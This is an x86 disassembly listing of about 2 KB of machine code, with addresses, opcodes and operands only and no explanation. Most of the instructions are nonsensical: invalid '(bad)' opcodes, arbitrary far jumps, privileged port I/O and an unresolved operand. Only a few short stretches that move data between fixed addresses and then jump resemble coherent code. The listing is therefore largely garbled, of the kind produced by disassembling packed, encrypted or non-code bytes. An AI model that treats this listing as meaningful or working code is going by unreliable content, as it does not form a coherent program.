  4051cc:	adc    ebp,DWORD PTR [ebx+0x520bbe67]
  4051d2:	push   ebp
  4051d3:	sub    eax,0x99565f73
  4051d8:	add    eax,0xd41aaae7
  4051dd:	out    dx,al
  4051de:	push   ss
  4051df:	test   al,0xc9
  4051e1:	push   esi
  4051e2:	sbb    DWORD PTR [edx],edx
  4051e4:	fisttp DWORD PTR [ebx]
  4051e6:	inc    ecx
  4051e7:	shl    DWORD PTR [eax-0x6de0938a],cl
  4051ed:	rcl    DWORD PTR [eax],cl
  4051ef:	or     BYTE PTR [ebx+0xc],dl
  4051f2:	jmp    0x7c07:0x58daa849
  4051f9:	sti    
  4051fa:	and    ebp,0xffffff8c
  4051fd:	dec    edx
  4051fe:	retf   0x445a
  405201:	mov    ebx,0x7251c631
  405206:	test   BYTE PTR [ebx-0x9fa6ff3],bl
  40520c:	jle    0x4051aa
  40520e:	pop    ds
  40520f:	cdq    
  405210:	mov    ds:0x6be2274a,eax
  405215:	mov    dl,0x24
  405217:	arpl   WORD PTR [esi+0x3b],bx
  40521a:	push   0xffffffbc
  40521c:	mov    al,0x33
  40521e:	adc    DWORD PTR [edx+0x68],eax
  405221:	dec    edi
  405222:	push   ds
  405223:	mov    eax,0xc560433
  405228:	mov    cl,BYTE PTR [eax]
  40522a:	int3   
  40522b:	pop    ecx
  40522c:	cld    
  40522d:	cmp    al,0x33
  40522f:	cmp    eax,0x2080d551
  405234:	mov    edi,0xc788c293
  405239:	lds    ecx,FWORD PTR [esi+0x79e4fb62]
  40523f:	scas   al,BYTE PTR es:[edi]
  405240:	stos   BYTE PTR es:[edi],al
  405241:	jae    0x40523f
  405243:	and    BYTE PTR [esi-0x75],al
  405246:	cli    
  405247:	pop    ebx
  405248:	and    ch,0x4b
  40524b:	outs   dx,DWORD PTR ds:[esi]
  40524c:	or     ecx,DWORD PTR [eax+ecx*8-0x1a]
  405250:	shl    BYTE PTR [esi-0x54b3b08f],cl
  405256:	cld    
  405257:	mov    ch,BYTE PTR [ecx]
  405259:	add    DWORD PTR [edi],ebp
  40525b:	add    eax,0x593c5d09
  405260:	jl     0x405267
  405262:	neg    BYTE PTR ss:[edx+eiz*1]
  405266:	xchg   ebp,esp
  405268:	enter  0x530d,0x3
  40526c:	pop    ebx
  40526d:	rol    DWORD PTR [edi-0x69],0xec
  405271:	das    
  405272:	sub    DWORD PTR [ebx],0xfffffffd
  405275:	int    0x84
  405277:	lahf   
  405278:	cmp    esp,DWORD PTR ds:0x742a6f06
  40527e:	inc    edi
  40527f:	xor    BYTE PTR [ebx],0x54
  405282:	lods   eax,DWORD PTR ds:[esi]
  405283:	jbe    0x40522c
  405285:	cwde   
  405286:	pop    di
  405288:	dec    esi
  405289:	xor    DWORD PTR [ebp+edx*1-0x78],ebp
  40528d:	mov    bh,0xd1
  40528f:	lds    esp,FWORD PTR [esp+eiz*4]
  405292:	js     0x405253
  405294:	push   es
  405295:	ret    
  405296:	pop    eax
  405297:	cmp    dl,BYTE PTR [esi+esi*4]
  40529a:	add    eax,edi
  40529c:	jne    0x40522c
  40529e:	dec    eax
  40529f:	sub    bh,BYTE PTR [edi-0x5f7cf46e]
  4052a5:	sti    
  4052a6:	scas   al,BYTE PTR es:[edi]
  4052a7:	in     al,0xad
  4052a9:	test   eax,0x32077dc6
  4052ae:	jp     0x4052e3
  4052b0:	std    
  4052b1:	retf   
  4052b2:	adc    ah,BYTE PTR [esi-0x3a]
  4052b5:	data16 cmp cl,BYTE PTR [edx-0x600550f]
  4052bc:	inc    esp
  4052bd:	cmp    BYTE PTR [esi],0x43
  4052c0:	push   0x76113f9b
  4052c5:	push   ecx
  4052c6:	lahf   
  4052c7:	sbb    al,0x78
  4052c9:	call   0x6b22c882
  4052ce:	jbe    0x405280
  4052d0:	jmp    0x7454:0xfb6166c6
  4052d7:	sbb    al,0xaf
  4052d9:	pop    edi
  4052da:	mov    edi,0xf013b233
  4052df:	mov    esi,DWORD PTR [ecx-0x23a77e0]
  4052e5:	and    BYTE PTR [esi+edi*1-0x48609d12],dh
  4052ec:	pop    es
  4052ed:	inc    edx
  4052ee:	popf   
  4052ef:	push   edx
  4052f0:	cli    
  4052f1:	scas   al,BYTE PTR es:[edi]
  4052f2:	scas   eax,DWORD PTR es:[edi]
  4052f3:	ficomp DWORD PTR [edx-0x2442cd65]
  4052f9:	jae    0x4052cd
  4052fb:	bound  ecx,QWORD PTR [esi]
  4052fd:	or     ecx,DWORD PTR [edx]
  4052ff:	inc    edi
  405300:	call   0x6b3873b1
  405305:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405306:	loopne 0x4052c8
  405308:	popa   
  405309:	(bad)  [ecx-0x24337dd3]
  40530f:	addr16 mov eax,ds:0xbc23
  405313:	pop    ecx
  405314:	pop    ecx
  405315:	retf   0x2163
  405318:	mov    ebp,0xf9f98b86
  40531d:	loop   0x405325
  40531f:	loop   0x4052bb
  405321:	and    edx,edx
  405323:	aam    0x64
  405325:	xor    eax,edi
  405327:	pop    esi
  405328:	sub    BYTE PTR [eax],cl
  40532a:	test   edi,esp
  40532c:	add    ah,BYTE PTR [ebp-0x5b]
  40532f:	xor    esi,DWORD PTR [esi]
  405331:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405332:	xor    DWORD PTR [edx+0x29],edx
  405335:	pop    edi
  405336:	(bad)  
  405337:	fsub   QWORD PTR [edx+0x3ac469b3]
  40533d:	dec    esi
  40533e:	sbb    al,0x85
  405340:	jle    0x405344
  405342:	mov    edx,0x24d0f69a
  405347:	push   edi
  405348:	ss cld 
  40534a:	aam    0x45
  40534c:	leave  
  40534d:	loop   0x4053a7
  40534f:	push   esp
  405350:	or     DWORD PTR [esi-0x8b385a6],0xffffffb4
  405357:	out    dx,eax
  405358:	loopne 0x405322
  40535a:	test   BYTE PTR [esi-0x35e7787f],bh
  405360:	dec    edx
  405361:	cli    
  405362:	push   ecx
  405363:	xor    eax,0x5df0ef7f
  405368:	jmp    0x6109:0x66be9e54
  40536f:	add    BYTE PTR [ebx-0x4d893171],cl
  405375:	out    0x47,eax
  405377:	lea    esp,[esi-0x50]
  40537a:	pushf  
  40537b:	fs int 0x6b
  40537e:	lds    esp,FWORD PTR [esi-0x71bffc7c]
  405384:	and    cl,BYTE PTR fs:[edi+0x4f5705b5]
  40538b:	cld    
  40538c:	out    dx,al
  40538d:	daa    
  40538e:	dec    DWORD PTR [eax+0x23]
  405391:	pop    edx
  405392:	gs mov esi,0x317cdf10
  405398:	mov    ch,bl
  40539a:	sahf   
  40539b:	pop    edi
  40539c:	sub    edx,DWORD PTR [edi+0x6f15321b]
  4053a2:	(bad)  [ecx+edx*1]
  4053a5:	sub    al,0xc2
  4053a7:	out    0xca,eax
  4053a9:	mov    WORD PTR [ecx],es
  4053ab:	push   esi
  4053ac:	jle    0x405392
  4053ae:	push   esi
  4053af:	pop    ss
  4053b0:	mov    edi,0xfaeb02e
  4053b5:	popa   
  4053b6:	test   eax,0xc932c841
  4053bb:	and    ecx,ebx
  4053bd:	test   eax,0xa38310c1
  4053c2:	not    DWORD PTR [ecx-0x55ef3f55]
  4053c8:	out    dx,al
  4053c9:	cmp    edi,DWORD PTR [edi]
  4053cb:	cld    
  4053cc:	data16 mov dl,al
  4053cf:	test   DWORD PTR [ebp-0x6af66f1b],ebp
  4053d5:	aam    0x47
  4053d7:	enter  0x9f8f,0x1
  4053db:	xchg   edx,eax
  4053dc:	mov    ds:0x4e436333,eax
  4053e1:	inc    ecx
  4053e2:	adc    eax,edi
  4053e4:	(bad)  
  4053e5:	enter  0xab9a,0xa3
  4053e9:	xchg   DWORD PTR [eax+ebp*2+0x4e],eax
  4053ed:	push   eax
  4053ee:	sub    cl,BYTE PTR [edi]
  4053f0:	aaa    
  4053f1:	inc    ebp
  4053f2:	pushf  
  4053f3:	push   ds
  4053f4:	adc    dh,BYTE PTR [esp+ebp*1+0x3cbb872c]
  4053fb:	repnz nop
  4053fd:	sbb    BYTE PTR [edx-0x425ae18a],0xfb
  405404:	jle    0x40538f
  405406:	and    esi,DWORD PTR [edi+0x12]
  405409:	jmp    0xecc6b32e
  40540e:	xchg   esp,eax
  40540f:	mov    edi,0x61c613cc
  405414:	fstp   st(5)
  405416:	cmc    
  405417:	pop    es
  405418:	inc    edx
  405419:	sar    BYTE PTR [edx+0x48],1
  40541c:	xchg   esp,eax
  40541d:	mov    cl,0x8b
  40541f:	mov    WORD PTR [edi-0x51850d1d],ss
  405425:	pop    eax
  405426:	jp     0x40548e
  405428:	ret    
  405429:	cdq    
  40542a:	and    al,0x8a
  40542c:	ins    DWORD PTR es:[edi],dx
  40542d:	mov    al,0xf3
  40542f:	sar    bh,1
  405431:	dec    ecx
  405432:	stos   BYTE PTR es:[edi],al
  405433:	jo     0x40543a
  405435:	repz loope 0x405472
  405438:	push   ecx
  405439:	aas    
  40543a:	mov    al,BYTE PTR [ebx-0x6a]
  40543d:	adc    BYTE PTR [edi+0x2e],0x1
  405441:	sub    ah,BYTE PTR [ebx+0x4a]
  405444:	mov    ebx,0x86ff22fc
  405449:	jl     0x40549a
  40544b:	inc    esi
  40544c:	in     eax,0x1e
  40544e:	cmp    eax,0x8210a8f8
  405453:	icebp  
  405454:	popf   
  405455:	cmp    eax,ebx
  405457:	imul   eax,DWORD PTR [ebp+0x6c35d095],0xffffff88
  40545e:	and    bh,BYTE PTR [eax+0x4de21366]
  405464:	or     DWORD PTR [edi+ebp*2-0x31],esp
  405468:	xor    al,0x53
  40546a:	fsubp  st(2),st
  40546c:	sbb    ecx,DWORD PTR [ebp-0x61]
  40546f:	dec    esp
  405470:	xchg   dh,bl
  405472:	dec    edx
  405473:	mov    eax,ds:0x91988eb0
  405478:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405479:	cmp    edx,DWORD PTR [ecx-0x27]
  40547c:	jl     0x405423
  40547e:	mov    ?,WORD PTR [ebp+0xcc2c95e]
  405484:	add    BYTE PTR [ebp-0x75],dl
  405487:	in     al,dx
  405488:	push   ecx
  405489:	mov    edx,DWORD PTR ds:0x42e784
  40548f:	mov    edx,DWORD PTR [edx]
  405491:	sbb    DWORD PTR ds:0x42e6eb,edx
  405497:	jmp    0x40576a
  40549c:	pop    ecx
  40549d:	scas   al,BYTE PTR es:[edi]
  40549e:	sbb    BYTE PTR [ebx-0xd],al
  4054a1:	push   ecx
  4054a2:	pop    ecx
  4054a3:	mov    dh,0xd4
  4054a5:	(bad)
  4054a8:	call   0x108ea58a
  4054ad:	aaa    
  4054ae:	jo     0x405520
  4054b0:	stos   BYTE PTR es:[edi],al
  4054b1:	jle    0x405523
  4054b3:	jo     0x40551b
  4054b5:	sub    al,0xcf
  4054b7:	in     al,0xa9
  4054b9:	test   esp,0x31e436c7
  4054bf:	dec    edi
  4054c0:	jp     0x4054d6
  4054c2:	or     DWORD PTR [edi-0x16],ebp
  4054c5:	hlt    
  4054c6:	mov    eax,0xce72d39
  4054cb:	mov    ecx,0x33a23c8
  4054d0:	xchg   edx,eax
  4054d1:	cli    
  4054d2:	pop    es
  4054d3:	(bad)  
  4054d4:	idiv   BYTE PTR [ecx-0x3b]
  4054d7:	adc    dh,BYTE PTR [ebx+0x3f]
  4054da:	out    0x55,eax
  4054dc:	sub    ch,cl
  4054de:	je     0x4054d2
  4054e0:	add    dh,bh
  4054e2:	push   ss
  4054e3:	lea    ebx,[edx+0x61b75ba8]
  4054e9:	js     0x4054fc
  4054eb:	jp     0x40548e
  4054ed:	xor    dl,BYTE PTR ds:0x7a9c3d5f
  4054f3:	psrad  mm5,QWORD PTR [edx]
  4054f6:	inc    edi
  4054f7:	call   0xbc67a028
  4054fc:	add    BYTE PTR [edx-0x21],al
  4054ff:	addr16 push ecx
  405501:	adc    esp,DWORD PTR [eax-0x30e0dcf5]
  405507:	push   ecx
  405508:	loop   0x405569
  40550a:	sub    DWORD PTR [ebx+0xc],esi
  40550d:	fmul   DWORD PTR [edx+eiz*1+0x1a2180e]
  405514:	or     DWORD PTR [ecx-0x4c],esi
  405517:	lock fsubr st,st(7)
  40551a:	ss xchg edi,eax
  40551c:	mov    ds:0xb1cecd2,al
  405521:	and    ch,BYTE PTR [ecx+0x44d57356]
  405527:	pop    ss
  405528:	test   BYTE PTR [esi],bh
  40552a:	cdq    
  40552b:	add    eax,0x6f9b4d9b
  405530:	lea    edx,[ecx+0x277df61]
  405536:	dec    edx
  405537:	xor    DWORD PTR [esi-0x69],edi
  40553a:	call   0x542c:0x6d39b89a
  405541:	dec    eax
  405542:	cmp    dh,cl
  405544:	in     eax,dx
  405545:	sbb    al,0xcd
  405547:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405548:	xor    eax,0x51021624
  40554d:	adc    al,0x7
  40554f:	aaa    
  405550:	hlt    
  405551:	inc    esp
  405552:	push   ebx
  405553:	outs   dx,BYTE PTR ds:[esi]
  405554:	mov    ds:0x76656ef5,eax
  405559:	mov    edi,0x17e118e1
  40555e:	xchg   edi,eax
  40555f:	mov    edi,0xaf3fed09
  405564:	lods   eax,DWORD PTR ds:[esi]
  405565:	lods   al,BYTE PTR ds:[esi]
  405566:	xchg   edi,eax
  405567:	sbb    al,0xd1
  405569:	fld    QWORD PTR [ecx-0x57]
  40556c:	(bad)  
  40556e:	inc    eax
  40556f:	cmp    eax,0x13352009
  405574:	popf   
  405575:	pusha  
  405576:	sbb    BYTE PTR [esp+ebp*1+0x4a],bh
  40557a:	push   ds
  40557b:	mov    bh,0x1a
  40557d:	add    DWORD PTR [esi+0x34dd0e1a],ecx
  405583:	int3   
  405584:	xor    ah,BYTE PTR [ebp+0x379ad7a6]
  40558a:	loop   0x4055cc
  40558c:	mov    eax,ds:0x990b1ca6
  405591:	loopne 0x4055df
  405593:	pushf  
  405594:	cld    
  405595:	jae    0x4055ef
  405597:	adc    al,0x90
  405599:	jmp    0xcd74:0x86f7078d
  4055a0:	cli    
  4055a1:	(bad)  
  4055a2:	repnz in eax,0xa1
  4055a5:	pop    ebx
  4055a6:	add    eax,0x566b2ae5
  4055ab:	pop    ebx
  4055ac:	jp     0x40556f
  4055ae:	jecxz  0x405595
  4055b0:	retf   
  4055b1:	pushf  
  4055b2:	mov    bl,0xbc
  4055b4:	outs   dx,DWORD PTR ds:[esi]
  4055b5:	push   ebp
  4055b6:	or     cl,dl
  4055b8:	xor    al,0x7b
  4055ba:	jle    0x4055aa
  4055bc:	rcr    DWORD PTR [edi+0x8],0x4
  4055c0:	mov    ebx,0x391ad912
  4055c5:	iret   
  4055c6:	mov    al,0x30
  4055c8:	rcl    BYTE PTR [edi],cl
  4055ca:	dec    ecx
  4055cb:	lods   al,BYTE PTR ds:[esi]
  4055cc:	cmp    esi,DWORD PTR [ebp+0x33]
  4055cf:	sub    BYTE PTR [esi-0x3e],dl
  4055d2:	out    dx,eax
  4055d3:	ss xchg edx,eax
  4055d5:	(bad)  [ebp-0x164727c9]
  4055db:	add    DWORD PTR [ebx-0x48],esi
  4055de:	dec    ebp
  4055df:	or     al,0x26
  4055e1:	cmc    
  4055e2:	jmp    0x405613
  4055e4:	add    al,0x64
  4055e6:	ret    0x3a9e
  4055e9:	sbb    esi,DWORD PTR [ebp+0x56780c10]
  4055ef:	push   ss
  4055f0:	fimul  DWORD PTR ds:0xbaaabf8b
  4055f6:	pop    es
  4055f7:	int3   
  4055f8:	xchg   edx,eax
  4055f9:	out    0x4,al
  4055fb:	(bad)  
  4055fc:	jbe    0x405677
  4055fe:	sub    al,al
  405600:	cwde   
  405601:	pusha  
  405602:	jo     0x40565b
  405604:	or     DWORD PTR [edi+0x48acbc51],esi
  40560a:	xor    ecx,DWORD PTR [esi]
  40560c:	jmp    0xf462:0x795e903d
  405613:	push   0xfb2d6d99
  405618:	cmp    dl,BYTE PTR [ebx]
  40561a:	je     0x405688
  40561c:	nop
  40561d:	dec    eax
  40561e:	out    dx,al
  40561f:	jnp    0x405631
  405621:	mov    eax,es:0xd9f9aff8
  405627:	(bad)  
  405629:	push   0xffffffb7
  40562b:	inc    ebx
  40562c:	sbb    BYTE PTR [edi],bl
  40562e:	pop    esp
  40562f:	mov    DWORD PTR [esi+0x3b],ecx
  405632:	xchg   BYTE PTR [eax+0x1],ch
  405635:	or     al,0xe1
  405637:	cli    
  405638:	repnz test BYTE PTR [esi-0x396275a],cl
  40563f:	leave  
  405640:	cmc    
  405641:	sahf   
  405642:	mov    eax,cs:0x2f872ecb
  405648:	inc    esi
  405649:	xor    bh,bh
  40564b:	test   BYTE PTR [edx-0x42],0xb8
  40564f:	mov    al,0x45
  405651:	mov    BYTE PTR [ebx],bh
  405653:	mov    edi,DWORD PTR ds:0xfdc5d559
  405659:	arpl   WORD PTR [eax+0x608eb34f],ax
  40565f:	and    dl,dl
  405661:	ins    DWORD PTR es:[edi],dx
  405662:	leave  
  405663:	out    dx,eax
  405664:	jmp    0xb133:0x4985de5a
  40566b:	mov    ah,0x4e
  40566d:	int    0x94
  40566f:	fwait
  405670:	pop    edx
  405671:	ret    
  405672:	outs   dx,DWORD PTR ds:[esi]
  405673:	imul   eax,DWORD PTR [edx],0x19
  405676:	add    al,BYTE PTR [eax+0x0]
  405679:	or     ebp,DWORD PTR [ecx+0x18]
  40567c:	mov    ebp,0xa4063d64
  405681:	mov    ebp,DWORD PTR [ecx]
  405683:	pop    ebp
  405684:	cmp    cl,ah
  405686:	adc    ch,BYTE PTR [ebx-0x3a]
  405689:	sub    eax,0xb0dbf801
  40568e:	xchg   ecx,eax
  40568f:	inc    esp
  405690:	pop    ecx
  405691:	cwde   
  405692:	pop    esi
  405693:	aas    
  405694:	or     BYTE PTR [edi+0x466b35cd],0x75
  40569b:	int3   
  40569c:	push   edx
  40569d:	dec    ebx
  40569e:	xor    al,0x39
  4056a0:	xchg   ebx,eax
  4056a1:	jge    0x4056ca
  4056a3:	les    edi,FWORD PTR [edi+0x2]
  4056a6:	(bad)  
  4056a7:	adc    BYTE PTR [edi+eiz*2+0x1837fec0],cl
  4056ae:	pushf  
  4056af:	scas   al,BYTE PTR es:[edi]
  4056b0:	dec    eax
  4056b1:	fnstenv [eax+0x4c2edb19]
  4056b7:	retf   
  4056b8:	sub    al,0x87
  4056ba:	adc    al,0xba
  4056bc:	xor    DWORD PTR [eax],esi
  4056be:	pop    edi
  4056bf:	sbb    cl,dl
  4056c1:	retf   
  4056c2:	scas   al,BYTE PTR es:[edi]
  4056c3:	mov    ah,BYTE PTR [eax]
  4056c5:	or     bh,bl
  4056c7:	mov    eax,0xd8178b86
  4056cc:	push   ebp
  4056cd:	mov    al,ds:0xf23e4b59
  4056d2:	stos   DWORD PTR es:[edi],eax
  4056d3:	dec    eax
  4056d4:	xor    BYTE PTR [ebx],bl
  4056d6:	push   edx
  4056d7:	lds    eax,FWORD PTR [ecx+eiz*1-0x59207079]
  4056de:	stos   BYTE PTR es:[edi],al
  4056df:	sbb    BYTE PTR [ebx+0x7e],bh
  4056e2:	cmp    BYTE PTR [esi-0x19],bh
  4056e5:	pop    edx
  4056e6:	pop    ss
  4056e7:	loop   0x405677
  4056e9:	sbb    DWORD PTR [eax+0x6b],ecx
  4056ec:	mov    eax,0x880f7852
  4056f1:	(bad)  
  4056f2:	in     al,0x26
  4056f4:	xor    bh,al
  4056f6:	jle    0x4056d8
  4056f8:	push   0x19
  4056fa:	rol    BYTE PTR [ebx],cl
  4056fc:	lods   al,BYTE PTR ds:[esi]
  4056fd:	data16 (bad) 
  405700:	out    0x2f,eax
  405702:	inc    ecx
  405703:	cwde   
  405704:	inc    eax
  405705:	fnsave [edi]
  405707:	mov    esi,0x854100dd
  40570c:	jle    0x405718
  40570e:	push   cs
  40570f:	mov    ebp,0xdc50be32
  405714:	sbb    dh,BYTE PTR [edx+0x18712fb0]
  40571a:	ficom  WORD PTR [ebx+edi*1-0x5d]
  40571e:	cmp    al,0xe4
  405720:	cmp    eax,0xcbcd431e
  405725:	xor    edi,ebp
  405727:	pop    ds
  405728:	ficomp WORD PTR [eax-0x2e57b56e]
  40572e:	(bad)  
  40572f:	out    dx,al
  405730:	test   eax,0x953b0c8
  405735:	pop    ss
  405736:	mov    ds:0x957819f2,al
  40573b:	and    al,0xd7
  40573d:	mov    dh,0xc6
  40573f:	push   esp
  405740:	dec    eax
  405741:	jle    0x4056c5
  405743:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405744:	lds    edx,FWORD PTR [eax]
  405746:	out    0xf0,eax
  405748:	ret    
  405749:	rep ins DWORD PTR es:[edi],dx
  40574b:	mov    bh,0x74
  40574d:	jle    0x405731
  40574f:	sbb    eax,0x7eab7875
  405754:	sar    BYTE PTR [ebx-0x62f2dfa],0x25
  40575b:	sar    DWORD PTR [edx+0x6d],0xbc
  40575f:	cmp    eax,0x8848ca71
  405764:	loopne 0x40577d
  405766:	scas   eax,DWORD PTR es:[edi]
  405767:	loope  0x40577f
  405769:	dec    esp
  40576a:	push   ecx
  40576b:	movzx  eax,WORD PTR ds:0x42fd86
  405772:	and    eax,DWORD PTR ds:0x42fd7a
  405778:	mov    ds:0x42fd86,eax
  40577d:	jmp    0x405a50
  405782:	ja     0x4057cf
  405784:	and    eax,0x717221b4
  405789:	dec    ebx
  40578a:	xchg   DWORD PTR [edx-0x22ef6e42],eax
  405790:	daa    
  405791:	lds    ecx,FWORD PTR [edx+0x35]
  405794:	jo     0x405806
  405796:	stos   BYTE PTR es:[edi],al
  405797:	jle    0x405809
  405799:	jo     0x405786
  40579b:	xor    eax,0xe4496e5d
  4057a0:	sbb    al,0x1d
  4057a2:	retf   
  4057a3:	adc    BYTE PTR [ebp+0x3dfc24c6],dl
  4057a9:	test   DWORD PTR [esi+0x2c],ebp
  4057ac:	xchg   ebx,eax
  4057ad:	mov    ss,WORD PTR [edi]
  4057af:	jbe    0x40580d
  4057b1:	fild   WORD PTR [ebx+edx*4+0x24]
  4057b5:	(bad)  
  4057b6:	cld    
  4057b7:	cld    
  4057b8:	inc    eax
  4057b9:	pop    es
  4057ba:	jl     0x4057df
  4057bc:	cmp    al,0x71
  4057be:	das    
  4057bf:	loop   0x4057d7
  4057c1:	and    al,0xaf
  4057c3:	cdq    
  4057c4:	cdq    
  4057c5:	js     0x405761
  4057c7:	nop
  4057c8:	dec    eax
  4057c9:	scas   eax,DWORD PTR es:[edi]
  4057ca:	push   edi
  4057cb:	out    dx,eax
  4057cc:	lods   eax,DWORD PTR ds:[esi]
  4057cd:	dec    eax
  4057ce:	addr16 ret 
  4057d0:	(bad)  
  4057d1:	pop    ebx
  4057d2:	jge    0x405852
  4057d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057d5:	pop    ebx
  4057d6:	mov    al,ds:0x64bf3bfb
  4057db:	loop   0x4057d1
  4057dd:	sbb    eax,0xcd4ff15c
  4057e2:	adc    ecx,0xffffffb3
  4057e5:	(bad)  
  4057e6:	sbb    BYTE PTR [edi-0x56de7c91],0xdb
  4057ed:	mov    ebx,DWORD PTR [ebp-0x5ea50cd9]
  4057f3:	jmp    0x4057b5
  4057f5:	imul   eax,DWORD PTR [esi+0x34],0xffffffea
  4057f9:	(bad)  
  4057fb:	sbb    DWORD PTR [ebp+0x302ef9f6],ebp
  405801:	ins    DWORD PTR es:[edi],dx
  405802:	jmp    0x71b01917
  405807:	jmp    0x321baed0
  40580c:	sub    bl,al
  40580e:	mov    eax,0xbe264b07
  405813:	or     BYTE PTR ds:0x6198e1d5,ch
  405819:	stos   DWORD PTR es:[edi],eax
  40581a:	mov    esp,0x14519c64
  40581f:	push   ebp
  405820:	mov    ah,0xa4
  405822:	bound  ecx,QWORD PTR [esi+0x7b]
  405825:	scas   al,BYTE PTR es:[edi]
  405826:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405827:	pop    eax
  405828:	aas    
  405829:	in     al,dx
  40582a:	(bad)  
  40582c:	pop    ecx
  40582d:	je     0x4057b2
  40582f:	cmp    al,0x57
  405831:	cmp    BYTE PTR [ebx+0x3f42c642],al
  405837:	sbb    BYTE PTR [ebx+0x3a],bh
  40583a:	dec    ecx
  40583b:	push   es
  40583c:	lock test al,0x17
  40583f:	dec    esp
  405840:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405841:	jmp    0x3ed2:0x1cb6b82
  405848:	je     0x4058c5
  40584a:	inc    esi
  40584b:	mov    ch,BYTE PTR [ebx+0x47389b75]
  405851:	mov    BYTE PTR [eax+0x4b082e12],bh
  405857:	stc    
  405858:	dec    esp
  405859:	es and eax,0x55e37bde
  40585f:	sub    DWORD PTR [esi],esp
  405861:	sti    
  405862:	inc    edx
  405863:	(bad)  
  405864:	push   ds
  405865:	ret    
  405866:	aad    0xcc
  405868:	call   0x5a9c68bf
  40586d:	(bad)  
  40586e:	call   0x2bd899ad
  405873:	lock adc eax,0xaf8c5f45
  405879:	mov    ds:0xf651377f,al
  40587e:	cld    
  40587f:	(bad)  
  405880:	repz push edi
  405882:	jp     0x405833
  405884:	sbb    edi,DWORD PTR [ecx+0x2e]
  405887:	or     al,0x92
  405889:	cwde   
  40588a:	mov    ds:0x474d44aa,eax
  40588f:	imul   ebx,DWORD PTR [esi-0x54f21511],0x1d
  405896:	in     eax,dx
  405897:	and    BYTE PTR [edi-0x790e8ea5],0x47
  40589e:	mov    al,BYTE PTR [esi-0x63001a26]
  4058a4:	gs dec ecx
  4058a6:	jne    0x40589b
  4058a8:	inc    edi
  4058a9:	jnp    0x4058de
  4058ab:	push   cs
  4058ac:	jecxz  0x4058f7
  4058ae:	or     eax,0xf3af0626
  4058b3:	jmp    0x50b79ec5
  4058b8:	std    
  4058b9:	xor    esp,esi
  4058bb:	pushf  
  4058bc:	loope  0x4058d3
  4058be:	stos   DWORD PTR es:[edi],eax
  4058bf:	data16 int3 
  4058c1:	adc    BYTE PTR [esi+0x27],0xf0
  4058c5:	push   edi
  4058c6:	adc    cl,BYTE PTR [ecx]
  4058c8:	int    0xf
  4058ca:	test   BYTE PTR [eax],al
  4058cc:	aas    
  4058cd:	sar    ebp,1
  4058cf:	fidivr DWORD PTR [ecx]
  4058d1:	arpl   WORD PTR [eax],si
  4058d3:	fild   QWORD PTR [edi]
  4058d5:	jl     0x40593e
  4058d7:	xchg   esi,eax
  4058d8:	or     dh,BYTE PTR [edx+0x53]
  4058db:	inc    ebp
  4058dc:	sar    DWORD PTR ds:0x53d4ba99,cl
  4058e2:	sar    BYTE PTR [eax],0xb5
  4058e5:	rcl    bh,0x11
  4058e8:	mov    eax,0x50012d85
  4058ed:	enter  0xe3bb,0x4a
  4058f1:	loopne 0x40589b
  4058f3:	and    dh,BYTE PTR [ebx]
  4058f5:	push   ss
  4058f6:	jp     0x4058dd
  4058f8:	not    ebp
  4058fa:	pushf  
  4058fb:	ins    BYTE PTR es:[edi],dx
  4058fc:	data16 addr16 repnz and al,0xc6
  405901:	aad    0xcb
  405903:	(bad)  
  405904:	int3   
  405905:	js     0x4058f4
  405907:	push   cs
  405908:	pop    ebp
  405909:	stc    
  40590a:	mov    bh,0x56
  40590c:	mov    dl,cl
  40590e:	retf   
  40590f:	ins    BYTE PTR es:[edi],dx
  405910:	loope  0x405921
  405912:	popa   
  405913:	push   ebx
  405914:	sub    DWORD PTR [edx+0x1],esi
  405917:	cli    
  405918:	push   cs
  405919:	rcl    BYTE PTR [edx-0x390d07cf],cl
  40591f:	xor    eax,0x4bee92b3
  405924:	cmp    ebp,DWORD PTR [ecx+edx*4]
  405927:	pop    edx
  405928:	sbb    ebx,esp
  40592a:	(bad)  
  40592b:	push   0xba8e037e
  405930:	out    dx,eax
  405931:	jb     0x4058ca
  405933:	or     al,0x80
  405935:	pop    esi
  405936:	fisubr WORD PTR ss:[edi+0x63]
  40593a:	cmp    BYTE PTR [eax],al
  40593c:	ins    DWORD PTR es:[edi],dx
  40593d:	inc    edi
  40593e:	scas   eax,DWORD PTR es:[edi]
  40593f:	xor    eax,0x392664e6
  405944:	call   0x86d5:0x350f55e
  40594b:	pushf  
  40594c:	test   al,0xf6
  40594e:	or     dh,dh
  405950:	add    DWORD PTR [edi+esi*2-0x54],esi
  405954:	mov    ch,0x8
  405956:	leave  
  405957:	test   al,0x7d
  405959:	fcomp  QWORD PTR [edx+0x702c9f79]
  40595f:	icebp  
  405960:	test   BYTE PTR [edx+0x6d],bh
  405963:	inc    ebx
  405964:	std    
  405965:	loope  0x40599b
  405967:	in     eax,0xf4
  405969:	popa   
  40596a:	inc    ecx
  40596b:	(bad)  
  40596c:	jecxz  0x4058f2
  40596e:	dec    esi
  40596f:	mov    ecx,0x959c144b
  405974:	call   0x694d0359
  405979:	cmp    ah,BYTE PTR [eax-0x60]
  40597c:	push   0x2f63cf09
  405981:	and    eax,0x69fa4612
  405986:	jmp    0xd210:0xd11239c4
  40598d:	mov    ebx,0x99cdff74
  405992:	es inc edi
  405994:	push   ss
  405995:	fs ja  0x40595c
  405998:	sbb    ah,BYTE PTR es:[ebp+0x1b40b403]
  40599f:	pop    ss
  4059a0:	iret   
  4059a1:	mov    esp,0x6227e00b
  4059a6:	adc    al,0xcc
  4059a8:	dec    ebp
  4059a9:	or     eax,0x8ba95424
  4059ae:	sbb    cl,BYTE PTR [ebx]
  4059b0:	adc    BYTE PTR [ecx],bh
  4059b2:	cmp    edx,eax
  4059b4:	inc    esp
  4059b5:	mov    ds:0x9ab0188,al
  4059ba:	xor    BYTE PTR [eax-0x788504b3],dl
  4059c0:	leave  
  4059c1:	inc    esi
  4059c2:	mov    cl,0x57
  4059c4:	mov    esp,0x39a7b9eb
  4059c9:	sub    eax,0x9429de27
  4059ce:	mov    eax,ds:0xf97e1230
  4059d3:	inc    ebx
  4059d4:	jmp    0x4059a8
  4059d6:	inc    ebx
  4059d7:	dec    edx
